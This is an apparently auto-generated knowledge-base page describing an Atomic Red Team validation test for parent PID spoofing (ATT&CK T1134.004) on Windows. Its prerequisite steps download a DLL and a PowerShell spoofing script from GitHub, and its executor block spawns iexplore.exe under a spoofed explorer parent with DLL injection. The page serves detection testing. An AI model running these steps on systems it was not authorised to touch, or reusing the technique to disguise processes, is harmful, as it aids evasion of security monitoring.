---
atomic_guid: "069258f4-2162-46e9-9a25-c9c6c56150d2"
title: "Parent PID Spoofing using PowerShell"
framework: "atomic"
generated: "true"
attack_technique_id: "T1134.004"
attack_technique_name: "Access Token Manipulation: Parent PID Spoofing"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.004/T1134.004.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "069258f4-2162-46e9-9a25-c9c6c56150d2"
  - "Parent PID Spoofing using PowerShell"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Parent PID Spoofing using PowerShell

This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.
Upon execution, "Process C:\Program Files\Internet Explorer\iexplore.exe is spawned with pid ####" will be displayed and
calc.exe will be launched.

Credit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)

## Metadata

- Atomic GUID: 069258f4-2162-46e9-9a25-c9c6c56150d2
- Technique: T1134.004: Access Token Manipulation: Parent PID Spoofing
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1134.004/T1134.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1134-access_token_manipulation|T1134.004]]

## Input Arguments

### dll_path

- description: Path of the dll to inject
- type: path
- default: PathToAtomicsFolder\T1134.004\bin\calc.dll

### dll_process_name

- description: Name of the created process from the injected dll
- type: string
- default: calculator

### parent_process_name

- description: Name of the parent process
- type: string
- default: explorer

### spawnto_process_name

- description: Name of the process to spawn
- type: string
- default: iexplore

### spawnto_process_path

- description: Path of the process to spawn
- type: path
- default: C:\Program Files\Internet Explorer\iexplore.exe

## Dependencies

DLL to inject must exist on disk at specified location (#{dll_path})

### Prerequisite Check

```text
if (Test-Path "#{dll_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory (split-path "#{dll_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll" -OutFile "#{dll_path}"
```

PPID.ps1 must exist on disk at $PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1

### Prerequisite Check

```text
if (Test-Path "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory (split-path "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1134.004/src/PPID-Spoof.ps1" -OutFile "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1"
```

## Executor

- name: powershell

### Command

```powershell
. "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1"
$ppid=Get-Process #{parent_process_name} | select -expand id
PPID-Spoof -ppid $ppid -spawnto "#{spawnto_process_path}" -dllpath "#{dll_path}"
```

### Cleanup

```powershell
Stop-Process -Name "#{dll_process_name}" -ErrorAction Ignore
Stop-Process -Name "#{spawnto_process_name}" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.004/T1134.004.yaml)
